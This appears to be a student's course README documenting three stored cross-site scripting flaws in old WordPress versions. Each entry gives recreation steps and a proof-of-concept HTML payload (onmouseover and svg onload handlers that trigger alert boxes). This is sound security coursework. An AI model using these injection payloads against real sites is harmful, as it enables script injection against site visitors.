# Project 7 - WordPress Pentesting

Time spent: **7** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

**1. (Required) Vulnerability Name or ID: Authenticated Stored Cross-Site Scripting**
  - [x] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.3.1
  - [x] GIF Walkthrough: <img src="XSS1.gif" width="800"> 
  - [x] Steps to recreate: Navigate to the side navigation menu. Click "Posts", and make a new post. Add the following to the body: ```<p>XSS Test 1<figure style="width: 1px;" class="wp-caption alignnone"><figcaption class="wp-caption-text"><a href="</figcaption></figure></a><a href="http://onMouseOver='alert(1)'">Hover here</a></p>```
  - [x] Affected source code:
    - [Link 1](https://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/)

**2. (Required) Vulnerability Name or ID: Authenticated Stored Cross-Site Scripting CVE-2015-3438**
  - [x] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.0
    - Fixed in version: 4.1.2
  - [x] GIF Walkthrough: <img src="XSS2.gif" width="800">
  - [x] Steps to recreate: Create a new post or go to an existing post. Scroll to the comment box and add the following to the body:
  ```<backquote cite="hey" onmouseover=alert("uh-oh")>testing xss 2```
  - [x] Affected source code: 
    - [Link 1](https://core.trac.wordpress.org/browser/tags/4.0.16/src/wp-comments-post.php)

**3. (Required) Vulnerability Name or ID: Authenticated Cross-Site Scripting**
  - [x] Summary:
    - Vulnerability types: XSS
    - Tested in version: 4.0
    - Fixed in version: 4.2.13
  - [x] GIF Walkthrough: <img src="XSS3.gif" width="800">
  - [x] Steps to recreate: Create a new post. Insert the following URL into the body:
  ```https://youtube[.]com/watch?v=abc<svg onload=alert("test")>```
  - [x] Affected source code: 
    - [Link 1](https://github.com/WordPress/WordPress/commit/c9e60dab176635d4bfaaf431c0ea891e4726d6e0)

    ## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [2018] [Jodie Ryu]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.